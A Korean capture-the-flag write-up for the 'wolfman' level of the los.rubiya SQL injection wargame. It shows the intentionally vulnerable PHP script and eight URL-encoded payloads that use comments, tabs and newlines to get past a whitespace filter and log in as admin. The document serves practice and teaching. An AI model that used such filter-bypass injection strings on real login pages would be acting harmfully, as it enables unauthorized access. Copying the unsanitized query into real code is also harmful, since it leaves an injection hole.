# Wolfman Problem

![Wolfman image](../image/wolfman_web_page.png)

### hint

sql injection 공백 우회

### los rubiya Problem Script

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

### 핵심

```php
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~");
if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
if($result['id'] == 'admin') solve("wolfman"); 
```

preg_match에 의해서 공백에 의해 exit() 가 나오는것을 볼 수 가있다.

즉 공백을 우회해서 id 가 admin으로 나와야된다.

<details>
<summary>Payload</summary>
<div markdown="1">

```sql
%27/**/or/**/1=1/**/limit/**/1,1/**/%23%27
> select id from prob_wolfman where id='guest' and pw=''/**/or/**/1=1/**/limit/**/1,1/**/#''

%27%09or%091=1%09limit%091,1%09%23%27
> select id from prob_wolfman where id='guest' and pw=''    or    1=1    limit    1,1    #''

%27%0aor%0a1=1%0alimit%0a1,1%0a%23%27
> select id from prob_wolfman where id='guest' and pw=''\nor\n1=1\nlimit\n1,1\n#''

%27%0dor%0d1=1%0dlimit%0d1,1%0d%23%27
> select id from prob_wolfman where id='guest' and pw=''\ror\r1=1\rlimit\r1,1\r#''

%27/**/or/**/id=%27admin%27%23%27
> select id from prob_wolfman where id='guest' and pw=''/**/or/**/id='admin'#''

%27%09or%09id=%27admin%27%23%27
> select id from prob_wolfman where id='guest' and pw=''    or    id='admin'#''

%27%0aor%0aid=%27admin%27%23%27
> select id from prob_wolfman where id='guest' and pw=''\nor\nid='admin'#''

%27%0dor%0did=%27admin%27%23%27
> select id from prob_wolfman where id='guest' and pw=''\ror\rid='admin'#''
```

query 를 완성시켜서 admin 유저가 나오게 하는 대신에

공백을 우회시켜 쿼리를 완성해야된다.

공백을 우회하기위해서는 주로 %0d %0a %09 /**/ 등으로 공백을 우회해서 할 수 있다.
```
%09 -> tab 한칸

%0a -> \n

%0d -> \r
```
</div>
</details>